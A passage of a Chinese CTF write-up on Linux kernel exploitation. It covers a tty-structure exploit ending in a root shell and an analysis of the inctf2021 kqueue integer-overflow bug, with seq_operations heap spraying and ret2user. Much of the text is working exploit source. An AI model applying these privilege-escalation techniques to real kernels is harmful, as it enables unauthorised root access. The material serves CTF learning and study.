class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">note_read</span><span class=\"token punctuation\">(</span>i <span class=\"token punctuation\">,</span> tty_buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x5401</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            tty_idx <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>tty_idx <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can not find tty\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    fake_tty_op_idx <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tty_idx <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n    vmlinux_base <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xfffffffffffff000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xe8e000</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tty_idx\"</span> <span class=\"token punctuation\">,</span> tty_idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fake_tty_op_idx\"</span> <span class=\"token punctuation\">,</span> fake_tty_op_idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vmlinux_base\"</span> <span class=\"token punctuation\">,</span> vmlinux_base <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>fake_tty_op_idx <span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span> <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    tty_addr <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>tty_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    fake_tty_op_addr <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>fake_tty_op_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tty_addr\"</span> <span class=\"token punctuation\">,</span> tty_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fake_tty_op_addr\"</span> <span class=\"token punctuation\">,</span> fake_tty_op_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_tty_op_addr<span class=\"token punctuation\">;</span>\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> work_for_cpu_fn <span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">note_write</span><span class=\"token punctuation\">(</span>tty_idx <span class=\"token punctuation\">,</span> tty_buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">note_write</span><span class=\"token punctuation\">(</span>fake_tty_op_idx <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>tty_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">114</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">note_read</span><span class=\"token punctuation\">(</span>tty_idx <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    size_t root_struct <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_tty_op_addr<span class=\"token punctuation\">;</span>\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> commit_creds<span class=\"token punctuation\">;</span>\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> root_struct<span class=\"token punctuation\">;</span>\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> root_struct<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root_struct\"</span> <span class=\"token punctuation\">,</span> root_struct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">note_write</span><span class=\"token punctuation\">(</span>tty_idx <span class=\"token punctuation\">,</span> tty_buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>tty_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">114</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token comment\">// 可以通过这种方法下断点来查看堆布局 pty_write</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>两种方法都可以提权成功，但是成功率都挺低的</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024135014621.png\" alt=\"image-20221024135014621\"></p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024134357599.png\" alt=\"image-20221024134357599\"></p>\n<h3 id=\"inctf2021-kqueue\"><a class=\"markdownIt-Anchor\" href=\"#inctf2021-kqueue\">#</a> inctf2021-kqueue</h3>\n<h4 id=\"漏洞分析-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞分析-2\">#</a> 漏洞分析</h4>\n<p>启动脚本如下</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">exec qemu-system-x86_64 \\\n    -cpu kvm64 \\\n    -m 512 \\\n    -nographic \\\n    -kernel &quot;bzImage&quot; \\\n    -append &quot;console&#x3D;ttyS0 panic&#x3D;-1 pti&#x3D;off kaslr quiet&quot; \\\n    -monitor &#x2F;dev&#x2F;null \\\n    -initrd &quot;.&#x2F;rootfs.cpio&quot; \\\n    -net user \\\n    -net nic \\\n    -s</code></pre>\n<p>其中只开启了 kaslr 保护，因此可以使用 ret2user 手法</p>\n<p>其漏洞发生在此处</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">static</span> noinline <span class=\"token keyword\">long</span> <span class=\"token function\">create_kqueue</span><span class=\"token punctuation\">(</span>request_t request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">long</span> result <span class=\"token operator\">=</span> INVALID<span class=\"token punctuation\">;</span>\n\t\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    \n    <span class=\"token comment\">/* Check if multiplication of 2 64 bit integers results in overflow */</span>\n    ull space <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_umulll_overflow</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>queue_entry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>max_entries<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>space<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> true<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">err</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Integer overflow\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Size is the size of queue structure + size of entry * request entries */</span>\n    ull queue_size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_saddll_overflow</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>space<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>queue_size<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> true<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">err</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Integer overflow\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Total size should not exceed a certain limit */</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>queue_size<span class=\"token operator\">></span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10000</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">err</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Max kqueue alloc limit reached\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>__builtin_umulll_overflow 虽然可以检测计算是否发生溢出，但是却忽视了 request.max_entries 可控，加 1 便可以直接溢出成 0 ，因此 space 被计算成了 0 ，然而 sizeof (queue) 大小为 0x20 ，那么 queue_size 就变成了 0x20，所以会分配 0x20 大小的堆块，但此时 max_entries 变成了一个很大的数，接下来观察下面的 save</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">static</span> noinline <span class=\"token keyword\">long</span> <span class=\"token function\">save_kqueue_entries</span><span class=\"token punctuation\">(</span>request_t request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\n    <span class=\"token comment\">/* Check if number of requested entries exceed the existing entries */</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>max_entries <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> request<span class=\"token punctuation\">.</span>max_entries <span class=\"token operator\">></span> queue<span class=\"token operator\">-></span>max_entries<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">err</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Invalid entry count\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Allocate memory for the kqueue to be saved */</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>new_queue <span class=\"token operator\">=</span> <span class=\"token function\">validate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">kzalloc</span><span class=\"token punctuation\">(</span>queue<span class=\"token operator\">-></span>queue_size<span class=\"token punctuation\">,</span>GFP_KERNEL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Each saved entry can have its own size */</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>data_size <span class=\"token operator\">></span> queue<span class=\"token operator\">-></span>queue_size<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">err</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Entry size limit exceed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Copy main's queue's data */</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>queue<span class=\"token operator\">-></span>data <span class=\"token operator\">&amp;&amp;</span> request<span class=\"token punctuation\">.</span>data_size<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">validate</span><span class=\"token punctuation\">(</span><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>new_queue<span class=\"token punctuation\">,</span>queue<span class=\"token operator\">-></span>data<span class=\"token punctuation\">,</span>request<span class=\"token punctuation\">.</span>data_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token function\">err</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Internal error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    new_queue <span class=\"token operator\">+=</span> queue<span class=\"token operator\">-></span>data_size<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Get to the entries of the kqueue */</span>\n    queue_entry <span class=\"token operator\">*</span>kqueue_entry <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>queue_entry <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>queue <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* copy all possible kqueue entries */</span>\n    uint32_t i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>request<span class=\"token punctuation\">.</span>max_entries<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>kqueue_entry <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>kqueue_entry<span class=\"token operator\">-></span>data<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>kqueue_entry<span class=\"token operator\">-></span>data <span class=\"token operator\">&amp;&amp;</span> request<span class=\"token punctuation\">.</span>data_size<span class=\"token punctuation\">)</span>\n            <span class=\"token function\">validate</span><span class=\"token punctuation\">(</span><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>new_queue<span class=\"token punctuation\">,</span>kqueue_entry<span class=\"token operator\">-></span>data<span class=\"token punctuation\">,</span>request<span class=\"token punctuation\">.</span>data_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">else</span>\n            <span class=\"token function\">err</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Internal error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        kqueue_entry <span class=\"token operator\">=</span> kqueue_entry<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n        new_queue <span class=\"token operator\">+=</span> queue<span class=\"token operator\">-></span>data_size<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/* Mark the queue as saved */</span>\n    isSaved<span class=\"token punctuation\">[</span>request<span class=\"token punctuation\">.</span>queue_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> true<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>这边首先进行过了一些判断，因为 max_entries 被变成了一个很大的数，因此这些检查是随便过的，随后，会分配一个 queue_size 大小的堆块，之后将原堆块的数据都复制一些进去，而此时的 queue_size 又很小，只有 0x20 大小，所以此时从 queue 复制的 第二份数据就会发生溢出，那么哪里来的第二份数据呢，这就需要弄一下堆风水了，让 queue 下面刚好是别人的 data 域</p>\n<p>然而在看头文件的时候发现</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">static</span> <span class=\"token keyword\">long</span> <span class=\"token function\">err</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span>KERN_ALERT <span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>是个假 error，没有直接退出而是返回…</p>\n<h4 id=\"漏洞利用-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用-2\">#</a> 漏洞利用</h4>\n<p>查看数据结构可以发现 data 域是 0x20 字节，因此为保证可以发生溢出，可以先将 cache 里的 0x20 大小的堆块清掉，随后申请的 0x20 大小的堆块就会连在一起了，随后在申请一个 max_entries 大于 1 的堆块，此时他的 data 域都是是连在一起的，这个时候再申请一个 错误的结构体（即 0x20 大小的 queue），这个结构体就会刚好在这两个 data 的上面，所以修改此 data 就相当于修改 queue 的 next。</p>\n<p>可以看到此时假 queue 的下面为我们伪造的 kqueue_entry ，data 域指向了我们 malloc 出的内存</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024135647103.png\" alt=\"image-20221024135647103\"></p>\n<p>因为本题除了 kaslr 啥都没开，所以可以直接访问到用户的数据，可以直接将 next 改成 用户态 malloc 出来的地址。</p>\n<p>随后堆喷 seq_operations 结构体，此结构体为 0x20 大小，并且其四个指针之一在 read 的时候会调用到，之后再 save 那个错误的堆块，此时会申请 0x20 大小的堆块，并且必会在 seq_operations 结构体的上方，因此就会将某一 seq_operations 结构体的指针给覆盖，覆盖成用户态的函数即可。</p>\n<p>此时已经在 某个 seq_operations 的上方覆盖成了 0x61，下一步 memcpy 就会复制到那个 seq_operations 处了</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024141326510.png\" alt=\"image-20221024141326510\"></p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024141516630.png\" alt=\"image-20221024141516630\"></p>\n<p>最后就是喜闻乐见的 ret2user 了</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;pthread.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;errno.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/syscall.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/userfaultfd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;poll.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span>\n\nsize_t vmlinux_base <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span><span class=\"token punctuation\">;</span>\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0x8c140</span><span class=\"token punctuation\">;</span>\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0x8c580</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp <span class=\"token punctuation\">,</span> user_rip<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">CREATE_KQUEUE <span class=\"token number\">0xDEADC0DE</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">EDIT_KQUEUE   <span class=\"token number\">0xDAADEEEE</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">DELETE_KQUEUE <span class=\"token number\">0xBADDCAFE</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">SAVE          <span class=\"token number\">0xB105BABE</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">INVALID      <span class=\"token operator\">-</span><span class=\"token number\">1</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">NOT_EXISTS   <span class=\"token operator\">-</span><span class=\"token number\">3</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">MAX_QUEUES    <span class=\"token number\">5</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">MAX_DATA_SIZE <span class=\"token number\">0x20</span></span></span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span>\n    uint32_t max_entries<span class=\"token punctuation\">;</span>\n    uint16_t data_size<span class=\"token punctuation\">;</span>\n    uint16_t entry_idx<span class=\"token punctuation\">;</span>\n    uint16_t queue_idx<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> data<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>request_t<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">queue_entry</span><span class=\"token punctuation\">&#123;</span>\n    uint16_t idx<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>queue_entry<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s : \\033[0m\\033[35m\\033[1m%#lx \\033[0m\\n\"</span><span class=\"token 